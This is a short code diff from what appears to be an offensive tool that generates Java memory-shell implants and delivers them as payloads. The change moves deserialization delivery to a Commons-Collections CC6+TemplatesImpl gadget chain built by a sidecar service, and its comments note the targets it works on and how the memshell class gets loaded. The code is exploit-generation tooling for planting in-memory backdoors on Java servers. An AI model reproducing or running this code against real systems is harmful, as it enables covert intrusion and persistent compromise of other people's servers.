@@ -101,17 +101,20 @@ async def generate_memshell(
         delivery_payload = PayloadResponse(type="jndi_rmi", content_type="text/plain", value=url)
 
     elif deliver_via == "serialize" and bytecode_b64:
-        # Wrap class bytes in CC6 gadget chain — works on JDK > 8u191 with gadget libs
+        # Wrap class bytes in CC6+TemplatesImpl gadget chain via sidecar.
+        # Uses BytecodeSerializeHandler (pure in-process, no ysoserial subprocess).
+        # Works on targets with commons-collections 3.x; memshell class is loaded
+        # via a generated AbstractTranslet wrapper with a custom ClassLoader.
         try:
             async with httpx.AsyncClient(timeout=s.sidecar_timeout) as cli:
                 r2 = await cli.post(
                     f"{s.sidecar_url}/generate",
-                    json={"chain": "ysoserial_cc6", "params": {"cmd": "", "bytecode_b64": bytecode_b64}},
+                    json={"chain": "serialize_bytecode_cc6", "params": {"bytecode_b64": bytecode_b64}},
                 )
             if r2.status_code == 200:
                 d2 = r2.json()
                 delivery_payload = PayloadResponse(
-                    type="serialize_cc6",
+                    type="serialize_cc6_bytecode",
                     content_type=d2.get("content_type", "application/octet-stream"),
                     value=d2.get("value", ""),
                 )
